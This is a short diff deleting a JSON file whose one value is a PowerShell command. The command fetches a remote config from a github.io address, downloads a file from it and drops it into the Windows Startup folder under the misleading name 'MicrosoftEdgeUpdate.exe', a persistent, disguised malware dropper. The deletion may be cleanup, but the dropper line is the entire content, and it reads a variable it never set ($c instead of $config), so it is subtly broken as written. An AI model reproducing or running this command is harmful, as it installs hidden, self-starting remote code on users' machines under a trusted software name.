@@ -1,3 +1,0 @@
-{
-  "script": "$config=Invoke-RestMethod 'https://vvecfs.github.io/1235/config.json'; Invoke-WebRequest $c.url -OutFile \"$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftEdgeUpdate.exe\""
-}
